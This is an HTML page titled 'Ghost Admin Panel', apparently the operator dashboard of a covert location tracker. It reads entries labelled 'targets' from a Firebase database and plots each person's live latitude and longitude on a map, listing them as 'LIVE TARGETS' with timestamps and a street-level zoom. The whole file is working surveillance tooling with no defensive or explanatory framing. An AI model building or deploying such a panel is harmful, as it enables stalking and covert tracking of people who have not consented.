<!DOCTYPE html>
<html>
<head>
    <title>Ghost Admin Panel</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        body { display: flex; height: 100vh; margin: 0; background: #000; color: lime; font-family: monospace; }
        #user-list { width: 300px; border-right: 1px solid lime; padding: 10px; overflow-y: auto; }
        #map-container { flex-grow: 1; position: relative; }
        #map { height: 100%; width: 100%; }
        .user-btn { background: #111; color: lime; border: 1px solid lime; padding: 10px; margin: 5px 0; width: 100%; cursor: pointer; text-align: left; }
        .user-btn:hover { background: lime; color: black; }
        .header { border-bottom: 1px solid lime; padding-bottom: 10px; margin-bottom: 10px; }
    </style>
</head>
<body>

    <div id="user-list">
        <div class="header">LIVE TARGETS</div>
        <div id="users">Waiting for connection...</div>
    </div>

    <div id="map-container">
        <div id="map"></div>
    </div>

    <script>
        const config = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
        firebase.initializeApp(config);
        const db = firebase.database();
        var map = L.map('map').setView([0, 0], 2);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
        var markers = {};

        // Real-time update for multiple users
        db.ref('targets').on('value', snapshot => {
            const usersDiv = document.getElementById('users');
            usersDiv.innerHTML = "";
            snapshot.forEach(user => {
                const data = user.val().location;
                const id = user.key;

                // Create Button
                let btn = document.createElement('button');
                btn.className = "user-btn";
                btn.innerHTML = `ID: ${id}<br>Time: ${data.timestamp}`;
                btn.onclick = () => {
                    map.setView([data.lat, data.lng], 18);
                };
                usersDiv.appendChild(btn);

                // Update Marker on Map
                if (markers[id]) {
                    markers[id].setLatLng([data.lat, data.lng]);
                } else {
                    markers[id] = L.marker([data.lat, data.lng]).addTo(map).bindPopup(id);
                }
            });
        });
    </script>
</body>
</html>
